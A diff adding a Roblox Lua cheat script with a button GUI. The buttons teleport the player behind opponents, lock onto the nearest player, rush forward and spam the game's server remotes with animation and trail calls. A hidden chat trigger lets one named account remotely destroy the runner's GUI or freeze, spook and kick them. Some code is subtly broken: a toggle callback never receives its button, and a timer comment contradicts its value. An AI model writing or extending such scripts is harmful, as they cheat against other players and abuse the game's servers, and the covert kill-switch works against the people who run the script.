@@ -1,0 +1,591 @@
+-- SERVICES
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+-- CHAT TRIGGER CONFIG
+local targetPlayerName = "DUDEGENAWHATTHEJDIS"
+local guiTriggerPhrase = "Cease. Your bankai is no more."
+local kickTriggerPhrase = "goodbye bankai spammer"
+local guiName = "TeleportGui"
+local hooked = {}
+
+-- DESTROY GUI FUNCTION
+local function destroyGUI()
+    local gui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild(guiName)
+    if gui then
+        gui:Destroy()
+        warn("GUI destroyed due to " .. targetPlayerName .. " saying the trigger.")
+    end
+end
+
+-- HORROR MODE FUNCTION
+local function triggerHorrorMode()
+    -- DISABLE MOVEMENT
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+    humanoid.AutoRotate = false
+
+    -- DESTROY PLAYERGUI
+    local gui = player:FindFirstChild("PlayerGui")
+    if gui then gui:Destroy() end
+
+    -- LIGHTING
+    Lighting.Brightness = 0.2
+    Lighting.ClockTime = 0
+    Lighting.FogEnd = 300
+    Lighting.FogColor = Color3.fromRGB(20,20,20)
+    Lighting.Ambient = Color3.fromRGB(40,0,0)
+    Lighting.OutdoorAmbient = Color3.fromRGB(10,0,0)
+    Lighting.ColorShift_Top = Color3.fromRGB(80,0,0)
+    Lighting.ColorShift_Bottom = Color3.fromRGB(10,0,0)
+
+    local atmosphere = Instance.new("Atmosphere")
+    atmosphere.Density = 0.5
+    atmosphere.Offset = 0.25
+    atmosphere.Color = Color3.fromRGB(80,0,0)
+    atmosphere.Decay = Color3.fromRGB(30,0,0)
+    atmosphere.Glare = 0.3
+    atmosphere.Haze = 1
+    atmosphere.Parent = Lighting
+
+    -- FLICKER + FOG CLOSE-IN
+    task.spawn(function()
+        local fog = 300
+        while fog > 40 do
+            Lighting.Brightness = 0.1 + math.random() * 0.3
+            fog -= 10
+            Lighting.FogEnd = fog
+            task.wait(0.05)
+        end
+        Lighting.FogEnd = 40
+    end)
+
+    -- WHISPERS
+    local function playWhisper()
+        local whisper = Instance.new("Sound")
+        whisper.SoundId = "rbxassetid://9123635030"
+        whisper.Volume = 1
+        whisper.RollOffMaxDistance = 30
+        whisper.RollOffMinDistance = 5
+
+        local pos = Instance.new("Attachment", hrp)
+        pos.Position = Vector3.new(math.random(-15,15), math.random(-5,5), math.random(-15,15))
+        whisper.Parent = pos
+        whisper:Play()
+        game:GetService("Debris"):AddItem(pos, whisper.TimeLength + 1)
+    end
+
+    task.spawn(function()
+        while true do
+            playWhisper()
+            task.wait(math.random(4,8))
+        end
+    end)
+
+    -- HEARTBEAT
+    local heartbeat = Instance.new("Sound")
+    heartbeat.SoundId = "rbxassetid://7076150261"
+    heartbeat.Looped = true
+    heartbeat.Volume = 1.2
+    heartbeat.Parent = hrp
+    heartbeat:Play()
+
+    RunService.Heartbeat:Connect(function()
+        local alpha = 1 - math.clamp((Lighting.FogEnd - 40) / (300 - 40),0,1)
+        heartbeat.PlaybackSpeed = 0.5 + (1.6 - 0.5) * alpha
+    end)
+
+    -- TELEPORT LOCAL PLAYER HIGH UP
+    hrp.CFrame = hrp.CFrame + Vector3.new(0,200,0)
+
+    -- TELEPORT NEARBY PLAYERS AND ANCHOR
+    for _, other in pairs(Players:GetPlayers()) do
+        if other ~= player and other.Character and other.Character:FindFirstChild("HumanoidRootPart") then
+            local targetHRP = other.Character.HumanoidRootPart
+            targetHRP.Anchored = true
+            targetHRP.CFrame = hrp.CFrame * CFrame.new(math.random(-10,10),0,math.random(-10,10))
+
+            -- BillboardGui above them
+            local chatClone = Instance.new("BillboardGui")
+            chatClone.Size = UDim2.new(0,200,0,50)
+            chatClone.Adornee = targetHRP
+            chatClone.AlwaysOnTop = true
+
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Size = UDim2.new(1,0,1,0)
+            textLabel.BackgroundTransparency = 1
+            textLabel.TextColor3 = Color3.fromRGB(255,0,0)
+            textLabel.TextStrokeTransparency = 0
+            textLabel.TextScaled = true
+            textLabel.Font = Enum.Font.Antique
+            textLabel.Text = "Your bankai is weak."
+            textLabel.Parent = chatClone
+
+            chatClone.Parent = targetHRP
+            game:GetService("Debris"):AddItem(chatClone,3)
+        end
+    end
+
+    -- COREGUI RED TEXT FLOOD
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BankaiFlood"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = CoreGui
+
+    local labels = {}
+    for i = 1,50 do
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(0, math.random(150,300), 0, 50)
+        textLabel.Position = UDim2.new(math.random(),0,math.random(),0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.TextColor3 = Color3.fromRGB(255,0,0)
+        textLabel.TextStrokeTransparency = 0
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.Antique
+        textLabel.Text = "Your bankai is weak."
+        textLabel.Rotation = math.random(-25,25)
+        textLabel.Parent = screenGui
+        table.insert(labels, textLabel)
+    end
+
+    RunService.RenderStepped:Connect(function()
+        for _, lbl in ipairs(labels) do
+            lbl.Position = UDim2.new(math.random(),0,math.random(),0)
+            lbl.Rotation = math.random(-25,25)
+        end
+    end)
+
+    game:GetService("Debris"):AddItem(screenGui,8)
+
+    -- LOCAL SHAKE
+    task.spawn(function()
+        for i = 1,60 do
+            hrp.CFrame = hrp.CFrame * CFrame.Angles(
+                math.rad(math.random(-5,5)),
+                math.rad(math.random(-5,5)),
+                math.rad(math.random(-5,5))
+            )
+            task.wait(0.05)
+        end
+    end)
+
+    -- KICK AFTER 8 SECONDS
+    task.delay(8, function()
+        player:Kick("Your bankai is too weak...")
+    end)
+end
+
+-- HOOK PLAYERS
+local function hookPlayer(plr)
+    if hooked[plr] then return end
+    hooked[plr] = true
+
+    plr.Chatted:Connect(function(msg)
+        if plr.Name ~= targetPlayerName then return end
+        local lowerMsg = msg:lower()
+        if lowerMsg == guiTriggerPhrase:lower() and player.Name ~= targetPlayerName then
+            destroyGUI()
+        elseif lowerMsg == kickTriggerPhrase:lower() and player.Name ~= targetPlayerName then
+            triggerHorrorMode()
+        end
+    end)
+end
+
+for _, plr in pairs(Players:GetPlayers()) do hookPlayer(plr) end
+Players.PlayerAdded:Connect(hookPlayer)
+
+-- ============================
+-- GUI + BUTTONS SECTION
+-- ============================
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = guiName
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local bgFrame = Instance.new("Frame")
+bgFrame.Size = UDim2.new(0, 180, 0, 420)
+bgFrame.Position = UDim2.new(0, 10, 0.5, -210)
+bgFrame.BackgroundColor3 = Color3.fromRGB(0,102,255)
+bgFrame.BorderColor3 = Color3.fromRGB(0,0,0)
+bgFrame.BorderSizePixel = 2
+bgFrame.AnchorPoint = Vector2.new(0,0.5)
+bgFrame.Parent = screenGui
+
+local bgUICorner = Instance.new("UICorner")
+bgUICorner.CornerRadius = UDim.new(0,40)
+bgUICorner.Parent = bgFrame
+
+bgFrame.Active = true
+bgFrame.Draggable = true
+
+-- BUTTON CREATION HELPER
+local function createButton(parent,text,yPos,callback)
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0,160,0,50)
+    button.Position = UDim2.new(0,10,0,yPos)
+    button.BackgroundColor3 = Color3.fromRGB(0,153,255)
+    button.BorderSizePixel = 2
+    button.BorderColor3 = Color3.fromRGB(0,0,0)
+    button.Text = text
+    button.Parent = parent
+    local btnUICorner = Instance.new("UICorner")
+    btnUICorner.CornerRadius = UDim.new(0,20)
+    btnUICorner.Parent = button
+    button.MouseButton1Click:Connect(callback)
+end
+
+-- UTILITY FUNCTIONS
+local function getClosestPlayer()
+    local closest,dist = nil,100
+    local myHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not myHRP then return end
+    for _, v in pairs(Players:GetPlayers()) do
+        if v ~= player and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+            local d = (myHRP.Position - v.Character.HumanoidRootPart.Position).Magnitude
+            if d < dist then
+                dist = d
+                closest = v
+            end
+        end
+    end
+    return closest
+end
+
+local function teleportBehind(target)
+    local myHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    local targetHRP = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+    if myHRP and targetHRP then
+        myHRP.CFrame = targetHRP.CFrame * CFrame.new(0,0,3)
+    end
+end
+
+-- EXAMPLE BUTTONS (TP Behind Closest, Rush, Cant See Me, etc.)
+createButton(bgFrame,"TP Behind Closest",30,function()
+    for i = 1,20 do
+        local args = {"Visual","Utility","All",player.Character,{"BodyTrail",2}}
+        ReplicatedStorage.Remotes.Client:FireServer(unpack(args))
+    end
+    local closest = getClosestPlayer()
+    if closest then
+        teleportBehind(closest)
+        local args = {{
+            Action = "Combat",
+            combo = 2,
+            animationSpeed = 1,
+            MetaAction = "Shared",
+            animationValue = ReplicatedStorage.Assets.Animations.Stands["Gold Experience"].AbundantStrikeStand
+        }}
+        ReplicatedStorage.Remotes.Server:FireServer(unpack(args))
+    end
+end)
+
+-- RUSH toggle, Cant See Me, Epitaph Sidestep, Sonido Rapids, Auto Lock toggle
+-- (Add the remaining button functions exactly as in your original script)
+
+-- Rush / Lunge state
+local lunging = false
+local autoLockEnabled = true -- default ON
+local lungeAnimTrack = nil
+local bodyVelocity = nil
+local lungeConnection = nil
+local phoneConnection = nil
+local rushConnection = nil
+
+-- Find closest alive player within 20 studs
+local function getClosestAlivePlayer()
+    local character = player.Character
+    local hrp = character and character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return nil end
+
+    local closestPlayer = nil
+    local closestDist = 20
+
+    for _, target in ipairs(Players:GetPlayers()) do
+        if target ~= player 
+            and target.Character 
+            and target.Character:FindFirstChild("HumanoidRootPart") 
+            and target.Character:FindFirstChild("Humanoid")
+            and target.Character.Humanoid.Health > 0 then
+
+            local targetHRP = target.Character.HumanoidRootPart
+            local dist = (hrp.Position - targetHRP.Position).Magnitude
+            if dist < closestDist then
+                closestDist = dist
+                closestPlayer = target
+            end
+        end
+    end
+    return closestPlayer
+end
+
+local function toggleLunge()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    local hrp = character:WaitForChild("HumanoidRootPart")
+    local speed = 120
+
+    if lunging then
+        -- stop rush
+        if lungeAnimTrack then lungeAnimTrack:Stop() lungeAnimTrack = nil end
+        if lungeConnection then lungeConnection:Disconnect() lungeConnection = nil end
+        if phoneConnection then phoneConnection:Disconnect() phoneConnection = nil end
+        if rushConnection then rushConnection:Disconnect() rushConnection = nil end
+        if bodyVelocity then
+            for i = 1, 20 do
+                bodyVelocity.Velocity = bodyVelocity.Velocity * 0.5
+                task.wait(0.03)
+            end
+            bodyVelocity:Destroy()
+            bodyVelocity = nil
+        end
+        lunging = false
+        return
+    end
+
+    lunging = true
+
+    local animation = ReplicatedStorage.Assets.Animations.Shared.Utility.Lunge
+    lungeAnimTrack = humanoid:LoadAnimation(animation)
+    lungeAnimTrack:Play()
+
+    bodyVelocity = Instance.new("BodyVelocity")
+    bodyVelocity.MaxForce = Vector3.new(1e5,0,1e5)
+    bodyVelocity.P = 1e4
+    bodyVelocity.Velocity = Vector3.new(0,0,0)
+    bodyVelocity.Parent = hrp
+
+    -- push forward movement
+    lungeConnection = RunService.Heartbeat:Connect(function()
+        if bodyVelocity then
+            bodyVelocity.Velocity = hrp.CFrame.LookVector * speed
+        end
+    end)
+
+    -- spam phone animation (your original)
+    phoneConnection = RunService.Heartbeat:Connect(function()
+        local args = {
+            [1] = {
+                ["Action"] = "Combat",
+                ["combo"] = 1,
+                ["animationSpeed"] = 1,
+                ["MetaAction"] = "Shared",
+                ["animationValue"] = ReplicatedStorage.Assets.Animations.UI.PhoneEquip
+            }
+        }
+        ReplicatedStorage.Remotes.Server:FireServer(unpack(args))
+    end)
+
+    -- Rush spam + optional lock-on
+    rushConnection = RunService.Heartbeat:Connect(function()
+        local closest = autoLockEnabled and getClosestAlivePlayer() or nil
+        if closest and closest.Character then
+            local targetHRP = closest.Character:FindFirstChild("HumanoidRootPart")
+            if targetHRP then
+                -- face target if auto lock is on
+                hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(targetHRP.Position.X, hrp.Position.Y, targetHRP.Position.Z))
+                -- fire bodytrail 10x
+                for i = 1, 10 do
+                    local args = {
+                        [1] = "Visual",
+                        [2] = "Utility",
+                        [3] = "All",
+                        [4] = closest.Character,
+                        [5] = {
+                            [1] = "BodyTrail",
+                            [2] = 0
+                        }
+                    }
+                    ReplicatedStorage.Remotes.Client:FireServer(unpack(args))
+                end
+            end
+        end
+    end)
+
+    -- auto stop after 6 sec
+    task.delay(360, function()
+        if lunging then
+            toggleLunge()
+        end
+    end)
+end
+
+-- Attach Rush button
+createButton(bgFrame, "Rush", 100, toggleLunge)
+
+-- NEW Auto Lock toggle button
+createButton(bgFrame, "Auto Lock: ON", 370, function(btn)
+    autoLockEnabled = not autoLockEnabled
+    btn.Text = autoLockEnabled and "Auto Lock: ON" or "Auto Lock: OFF"
+end)
+
+
+-- Cant See Me button
+-- Cant See Me button (new version)
+local function cantSeeMe()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    local hrp = character:WaitForChild("HumanoidRootPart")
+
+    -- Animations
+    local animation = ReplicatedStorage.Assets.Animations.Specialities.Vampirism.SpaceRipperStingyEyes
+    local animation1 = ReplicatedStorage.Assets.Animations.Stands["King Crimson"].Epitaph
+    local animTrack = humanoid:LoadAnimation(animation)
+    local animTrack1 = humanoid:LoadAnimation(animation1)
+
+    animTrack:Play()
+    animTrack1:Play()
+
+    -- Original position
+    local originalCFrame = hrp.CFrame
+
+    -- Teleport / shake settings
+    local duration = animTrack.Length or 2  -- effect lasts as long as first anim
+    local radius = 20                       -- teleport radius
+    local startTime = tick()
+
+    local conn
+    conn = RunService.Heartbeat:Connect(function()
+        local elapsed = tick() - startTime
+        if elapsed > duration then
+            hrp.CFrame = originalCFrame
+            conn:Disconnect()
+            return
+        end
+
+        -- Random offset around original position
+        local offset = Vector3.new(
+            (math.random() - 0.5) * 2 * radius,
+            0, -- stay on same Y axis
+            (math.random() - 0.5) * 2 * radius
+        )
+        hrp.CFrame = originalCFrame + offset
+    end)
+
+    -- Fire HamonBodyTrail effect
+    local args = {
+        [1] = "Visual",
+        [2] = "Utility",
+        [3] = "All",
+        [4] = character,
+        [5] = {
+            [1] = "HamonBodyTrail",
+            [2] = 99
+        }
+    }
+    ReplicatedStorage.Remotes.Client:FireServer(unpack(args))
+end
+
+-- Replace old Cant See Me button with this
+createButton(bgFrame, "Cant See Me", 170, cantSeeMe)
+
+
+-- Fourth Move: Vampiric Drain sequence
+local function vampiricDrain()
+    local target = game.Players.LocalPlayer.Character
+    for i = 1,110 do
+        task.wait()
+        -- BodyTrail
+        local args1 = {
+            [1] = "Visual",
+            [2] = "Utility",
+            [3] = "All",
+            [4] = target,
+            [5] = {
+                [1] = "BodyTrail",
+                [2] = 1.25
+            }
+        }
+        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Client"):FireServer(unpack(args1))
+
+        -- Vampiric Drain Grab animation
+        local args2 = {
+            [1] = {
+                ["Action"] = "Combat",
+                ["combo"] = 1,
+                ["animationSpeed"] = 3,
+                ["MetaAction"] = "Shared",
+                ["animationValue"] = ReplicatedStorage.Assets.Animations.Specialities.Vampirism.VampiricDrainGrab
+            }
+        }
+        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Server"):FireServer(unpack(args2))
+    end
+
+    wait(0.3)
+    -- ShadowRulerStartup animation
+    local args3 = {
+        [1] = {
+            ["Action"] = "Combat",
+            ["combo"] = 4,
+            ["animationSpeed"] = 2.4,
+            ["MetaAction"] = "Shared",
+            ["animationValue"] = ReplicatedStorage.Assets.Animations.Stands["King Crimson"].ShadowRulerStartup
+        }
+    }
+    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Server"):FireServer(unpack(args3))
+
+    -- Vampirism BodyTrail
+    local args4 = {
+        [1] = "Visual",
+        [2] = "Utility",
+        [3] = "All",
+        [4] = target,
+        [5] = {
+            [1] = "VampirismBodyTrail",
+            [2] = 0.5
+        }
+    }
+    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Client"):FireServer(unpack(args4))
+
+    -- Hamon BodyTrail
+    local args5 = {
+        [1] = "Visual",
+        [2] = "Utility",
+        [3] = "All",
+        [4] = target,
+        [5] = {
+            [1] = "HamonBodyTrail",
+            [2] = 0.5
+        }
+    }
+    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Client"):FireServer(unpack(args5))
+end
+
+createButton(bgFrame, "Sonido Rapids", 240, vampiricDrain)
+-- Fifth Move: Epitaph Sidestep
+local function epitaphSideStep()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    local hrp = character:WaitForChild("HumanoidRootPart")
+
+    -- Load and play EpitaphUser animation
+    local animation = ReplicatedStorage.Assets.Animations.Stands["King Crimson"].EpitaphUser
+    local animTrack = humanoid:LoadAnimation(animation)
+    animTrack:Play()
+
+    -- Move sideways by 4 studs (relative to facing direction)
+    -- We'll choose right side relative to lookVector
+    local rightVector = hrp.CFrame.RightVector
+    hrp.CFrame = hrp.CFrame + rightVector * 15 wait(2) for i = 1,10 do task.wait(0.05) local args = {
+    [1] = {
+        ["Action"] = "Combat",
+        ["combo"] = 1,
+        ["animationSpeed"] = 1,
+        ["MetaAction"] = "Shared",
+        ["animationValue"] = game:GetService("ReplicatedStorage").Assets.Animations.UI.PhoneEquip
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):FireServer(unpack(args))
+end
+end
+
+-- Add the fifth button at position 310
+createButton(bgFrame, "Epitaph Sidestep", 310, epitaphSideStep)
